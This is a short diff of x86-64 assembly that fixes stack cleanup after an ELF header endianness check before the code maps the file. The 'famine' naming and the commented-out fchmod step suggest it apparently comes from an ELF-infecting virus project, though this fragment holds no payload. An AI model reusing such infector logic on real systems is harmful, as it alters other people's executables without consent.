@@ -104,11 +104,12 @@ section .text
                 ; Little endian
                 cmp byte [rsp + 5], 1     ;EI_DATA (little endian)
                 jne .exit_maigc_numbers
+                add rsp, 64
                 jmp .mmap
             
-            .exit_maigc_numbers:
-                add rsp, 64
-                jmp .close_file
+                .exit_maigc_numbers:
+                    add rsp, 64
+                    jmp .close_file
 
             ; .fchmod:
             ;     mov rdi, VAR(famine.fd_file)
